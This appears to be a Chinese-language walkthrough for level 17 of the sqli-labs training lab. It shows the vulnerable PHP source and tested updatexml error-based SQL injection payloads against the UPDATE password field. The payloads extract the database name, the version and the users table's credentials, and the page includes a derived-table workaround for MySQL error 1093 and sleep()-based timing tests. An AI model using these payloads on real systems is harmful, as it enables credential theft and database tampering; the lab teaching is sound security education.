# Less-17

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · UPDATE 注入 |
| **闭合方式** | `'` |
| **成败信号** | XPATH 报错 |
| **一句话** | 改密码处注入（会真的改库） |
| **核心 payload** | `passwd=' or updatexml(1,concat(0x7e,database()),1) or '` |

---

**POST · UPDATE 语句注入 · 单引号**

### 源码

```php
// 用户名经过了 check_input() 过滤，安全
$uname  = check_input($_POST['uname']);
$passwd = $_POST['passwd'];          // ← 密码没过滤！

$sql = "SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
$row1 = mysql_fetch_array($result);

$update = "UPDATE users SET password = '$passwd' WHERE username='$row1'";
mysql_query($update);
```

### 这关的两个特殊点

**① 注入点在「新密码」框，不在用户名框**

`check_input()` 干了三件事：
```php
$value = substr($value, 0, 15);                       // 截断到 15 字符
if (get_magic_quotes_gpc()) stripslashes($value);     // 处理魔术引号
if (!ctype_digit($value))                             // 非纯数字就用它转义并加引号
    $value = "'" . mysql_real_escape_string($value) . "'";
```
`mysql_real_escape_string()` 会把 `'` 转义成 `\'`，所以**用户名框打不进去**。
但 `$passwd` 是原样拼进 SQL 的 —— 突破口在密码框。

**② 这关会真的改数据库**

它是 `UPDATE` 语句，注入成功 = 真的执行了修改。**做完记得把密码改回去**：
```
uname = admin
passwd = admin        （正常提交，把 admin 的密码重置回 admin）
```

### 通关 payload（实测）

用户名必须填一个**真实存在**的用户（否则 `$row1` 为空，后面 UPDATE 不执行）。

**① 报错注入拿库名**
```
uname  = admin
passwd = ' or updatexml(1,concat(0x7e,database()),1) or '
→  XPATH syntax error: '~security'   ✓
```

**② 拿版本**
```
passwd = ' or updatexml(1,concat(0x7e,version()),1) or '
→  XPATH syntax error: '~5.7.26'   ✓
```

**③ 拖库时的坑：MySQL 1093 错误**

直接子查询 `users` 表会失败：
```
passwd = ' or updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) or '
→  失败（MySQL 不允许在 UPDATE 某表时子查询同一张表）
```

**解决办法：套一层派生表**（`select * from (...) x`），让 MySQL 先把子查询物化成临时表：

```
passwd = ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
→  XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'   ✓ 成功！
```

> 💡 这个派生表绕过的技巧很实用，遇到 `ERROR 1093` 就用它。

**④ `and` 还是 `or`？—— 实测两个都能用**

| payload | 实测结果 |
|---|---|
| `' or updatexml(1,concat(0x7e,database()),1) or '` | `XPATH syntax error: '~security'` ✓ |
| `' and updatexml(1,concat(0x7e,database()),1) and '` | `XPATH syntax error: '~security'` ✓ |

两个都成功。原因是 **`updatexml()` 的 XPath 参数必须是常量**，传列名进去会被 MySQL 直接拒绝：

```
?id=1' and updatexml(1,concat(0x7e,username),1)--+
→ Only constant XPATH queries are supported
```

既然是常量，MySQL 在**优化阶段就把它算掉了**，而优化发生在 WHERE 求值**之前**。
所以 `and` 左边是真是假，都不影响报错触发。

> ⚠️ 但**别以为 `and` 永远安全** —— 短路求值本身是真实存在的，只是管不到常量表达式：

| 测试 | 耗时 | 说明 |
|---|---|---|
| `?id=1' and sleep(3)--+` | 3.24s | 左边为真 → 右边执行 |
| `?id=-1' and sleep(3)--+` | 0.22s | 左边为假 → **右边被短路，根本没执行** |

`sleep()` 不是常量、折叠不掉，所以老老实实遵守短路规则。

**真正的规则**：
- 报错函数里放**常量**（`database()` / `version()` / 子查询）→ 优化期就被折叠，`and`、`or` 都行
- 放**折叠不掉**的东西（`sleep()`、依赖行的表达式）→ 左边为假时 `and` 会失效，这时必须用 `or`

---

[← Less-16](Less-16.md) ｜ [返回目录](README.md) ｜ [Less-18 →](Less-18.md)